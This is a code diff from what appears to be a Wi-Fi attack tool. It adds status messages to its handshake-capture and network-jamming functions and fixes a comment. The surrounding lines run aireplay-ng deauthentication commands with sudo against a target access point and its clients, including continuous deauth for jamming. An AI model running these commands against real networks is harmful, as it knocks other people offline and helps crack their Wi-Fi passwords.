@@ -832,6 +832,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                               # Continuosly deauth deauth all clients
                               command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', target_client, interface]
                               subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                              print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
                          except KeyboardInterrupt:
                               pass
                          except subprocess.CalledProcessError as e:
@@ -842,6 +843,7 @@ def handshake_crack(target_ap, interface, deauth_mode, target):
                          # Continuosly deauth deauth all clients
                          command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
                          subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
+                         print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
                     except KeyboardInterrupt:
                          pass
                     except subprocess.CalledProcessError as e:
@@ -1162,7 +1164,7 @@ def jam_network(target_ap, interface, jammer_mode):
                if jammer_mode == "client jamming":
                     if target_client:
                          try:
-                              # Continuosly deauth deauth all clients
+                              # Continuosly deauth client
                               command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', target_client, interface]
                               subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
                          except KeyboardInterrupt:
